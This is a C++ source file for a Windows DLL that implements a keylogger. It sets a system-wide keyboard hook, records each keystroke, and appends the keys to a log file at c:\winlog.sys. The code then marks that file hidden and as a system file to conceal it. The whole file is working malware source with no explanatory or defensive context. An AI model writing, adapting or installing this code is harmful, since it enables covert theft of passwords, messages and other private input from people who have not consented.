// antikldll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"

#pragma data_seg(".SHARDAT")
static HHOOK msg=NULL;
#pragma data_seg()

#include <stdio.h>

#define FILEPATH "c:\\winlog.sys"

enum{VK_0=30, VK_1, VK_2, VK_3, VK_4, VK_5, VK_6, VK_7, VK_8, VK_9};
enum{VK_A=41, VK_B, VK_C, VK_D, VK_E, VK_F, VK_G, VK_H, VK_I, VK_J, VK_K, VK_L, VK_M, VK_N, VK_O, VK_P, VK_Q, VK_R, VK_S, VK_T, VK_U, VK_V, VK_W, VK_X, VK_Y, VK_Z};

HINSTANCE hins;
HWND parenthWnd;

FILE* keyboardLog;

BOOL APIENTRY DllMain( HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	hins=(HINSTANCE)hModule;
    return TRUE;
}

LRESULT __declspec(dllexport)__stdcall CALLBACK KeyboardProc (int nCode, WPARAM wParam, LPARAM lParam)
{
	char ch;
	if (((DWORD)lParam & 0x40000000) && (nCode==HC_ACTION))
	{
		keyboardLog = fopen(FILEPATH,"a");

		if ((wParam==VK_SPACE)||(wParam==VK_RETURN)||(wParam>=0x2f ) &&(wParam<=0x100)) 
        {
            if (wParam==VK_RETURN)
				fwrite("\n",1,1,keyboardLog);
			else if(wParam == VK_SPACE)
				fwrite(" ",1,1,keyboardLog);
            else
            {
                BYTE ks[256];
				memset(ks,256,sizeof(BYTE));
                GetKeyboardState(ks);

                WORD outChar;
                UINT scan=0;
                ToAscii(wParam,scan,ks,&outChar,0);
				ch = char(outChar);
				fwrite(&ch,1,1,keyboardLog);
             }
        }
		fclose(keyboardLog);

	}
	return CallNextHookEx( msg, nCode, wParam, lParam );
}

BOOL __declspec(dllexport)__stdcall InstallHook()
{
	keyboardLog = fopen(FILEPATH,"a");
	fclose(keyboardLog);

	SetFileAttributes(FILEPATH,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_NOT_CONTENT_INDEXED|FILE_ATTRIBUTE_SYSTEM);

	msg=SetWindowsHookEx(WH_KEYBOARD,(HOOKPROC)KeyboardProc,hins,0);

	return TRUE;
}

BOOL __declspec(dllexport)__stdcall  UnHook()
{
	fclose(keyboardLog);
	return UnhookWindowsHookEx(msg);
} 